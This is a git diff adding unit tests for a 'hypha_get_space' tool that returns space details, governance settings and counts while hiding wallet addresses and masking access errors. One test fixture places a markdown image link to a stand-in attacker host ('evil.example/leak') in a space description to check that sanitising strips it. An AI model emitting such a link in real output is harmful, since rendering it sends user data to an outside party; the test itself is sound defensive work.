@@ -327,6 +327,147 @@ describe('hypha_get_my_membership', () => {
   });
 });
 
+describe('hypha_get_space', () => {
+  const detail = (over: Record<string, unknown> = {}) => ({
+    ...rawSpace(),
+    subspaces: [rawSpace({ id: 2, slug: 'child' })],
+    parentSlug: 'org',
+    visibility: { discoverability: 2, access: 1 },
+    governance: {
+      quorum: 40,
+      unity: 70,
+      votingPowerSource: 3,
+      joinMethod: 2,
+    },
+    counts: { memberCount: 9 },
+    asOf: '2026-11-19T00:00:00.000Z',
+    asOfBlock: 1,
+    ...over,
+  });
+  const getting = (data: unknown) =>
+    ({ getSpace: async () => ({ ok: true, data }) } as never);
+
+  it('returns the space with governance words, counts and visibility; no subspaces, no addresses', async () => {
+    const { deps } = makeDeps(
+      {},
+      getting(
+        detail({
+          memberAddresses: [ADDR],
+          address: ADDR,
+          creatorAddress: ADDR,
+          members: [{ address: ADDR }],
+        }),
+      ),
+    );
+    const r = await call(deps, 'hypha_get_space', { slug: 'alpha' });
+    expect(r.isError).toBeUndefined();
+    expect(r.structuredContent).toMatchObject({
+      slug: 'alpha',
+      url: 'https://app.example/en/dho/alpha/overview',
+      parentSlug: 'org',
+      lifecycle: 'live',
+      archived: false,
+      counts: { memberCount: 9 },
+      visibility: { discoverability: 2, access: 1 },
+      governance: {
+        quorum: 40,
+        unity: 70,
+        votingPowerSource: 'voice',
+        joinMethod: 'invite_only',
+      },
+    });
+    expect(r.structuredContent).not.toHaveProperty('subspaces');
+    expect(r.structuredContent).not.toHaveProperty('childSlugs');
+    expect(r.structuredContent).not.toHaveProperty('governance.exitMethod');
+    expect(JSON.stringify(r)).not.toContain('0x');
+    expect(JSON.parse(r.content[0]!.text)).toEqual(r.structuredContent);
+  });
+
+  it('the omit flags map to the feature blocks (all on by default)', async () => {
+    const getSpace = vi.fn(async () => ({ ok: true as const, data: detail() }));
+    const { deps } = makeDeps({}, { getSpace } as never);
+    await call(deps, 'hypha_get_space', { slug: 'alpha' });
+    expect(getSpace).toHaveBeenLastCalledWith(
+      {
+        slug: 'alpha',
+        with: { visibility: true, governance: true, counts: true },
+      },
+      expect.anything(),
+    );
+    await call(deps, 'hypha_get_space', {
+      slug: 'alpha',
+      omitVisibility: true,
+      omitGovernance: true,
+      omitCounts: true,
+    });
+    expect(getSpace).toHaveBeenLastCalledWith(
+      {
+        slug: 'alpha',
+        with: { visibility: false, governance: false, counts: false },
+      },
+      expect.anything(),
+    );
+  });
+
+  it('an omitted block is absent; an unreadable one is null, never 0', async () => {
+    const { deps } = makeDeps(
+      {},
+      getting({
+        ...detail({ governance: null, counts: { memberCount: null } }),
+        visibility: undefined,
+      }),
+    );
+    const r = await call(deps, 'hypha_get_space', { slug: 'alpha' });
+    expect(r.structuredContent).toMatchObject({
+      governance: null,
+      counts: { memberCount: null },
+    });
+    expect(r.structuredContent).not.toHaveProperty('visibility');
+  });
+
+  it('sanitises user text', async () => {
+    const { deps } = makeDeps(
+      {},
+      getting(
+        detail({
+          title: `Hi${ZERO_WIDTH} there`,
+          description: 'see ![x](https://evil.example/leak?d=1)',
+        }),
+      ),
+    );
+    const r = await call(deps, 'hypha_get_space', { slug: 'alpha' });
+    const t = (
+      r.structuredContent as {
+        userText: { title: string; description: string };
+      }
+    ).userText;
+    expect(t.title).toBe('Hi there');
+    expect(t.description).not.toMatch(/evil\.example/);
+  });
+
+  it('unknown, not visible and forbidden give the same answer', async () => {
+    const texts = new Set<string>();
+    for (const code of ['not_found', 'forbidden', 'unauthenticated'] as const) {
+      const { deps } = makeDeps({}, {
+        getSpace: async () => ({ ok: false, code }),
+      } as never);
+      const r = await call(deps, 'hypha_get_space', { slug: 'secret' });
+      expect(r.isError).toBe(true);
+      texts.add(r.content[0]!.text);
+    }
+    expect(texts.size).toBe(1);
+  });
+
+  it('an access check that cannot be read is the typed unavailable error', async () => {
+    const { deps } = makeDeps({}, {
+      getSpace: async () => ({ ok: false, code: 'access_check_failed' }),
+    } as never);
+    const r = await call(deps, 'hypha_get_space', { slug: 'alpha' });
+    expect(r.isError).toBe(true);
+    expect(r.content[0]!.text).toMatch(/could not check access/i);
+  });
+});
+
 describe('every tool: refusals, deadline, errors', () => {
   it('no profile is a clear tool error, never data', async () => {
     const { deps, logs } = makeDeps({
@@ -340,13 +481,18 @@ describe('every tool: refusals, deadline, errors', () => {
     });
     for (const [name, args] of [
       ['hypha_list_spaces', {}],
+      ['hypha_get_space', { slug: 'alpha' }],
       ['hypha_get_my_membership', { spaceSlug: 'alpha' }],
     ] as const) {
       const r = await call(deps, name, args);
       expect(r.isError).toBe(true);
       expect(r.content[0]!.text).toContain('No Hypha profile');
     }
-    expect(logs.map((l) => l.outcome)).toEqual(['no_profile', 'no_profile']);
+    expect(logs.map((l) => l.outcome)).toEqual([
+      'no_profile',
+      'no_profile',
+      'no_profile',
+    ]);
   });
 
   it('a tripped limit is a tool error with retry info', async () => {
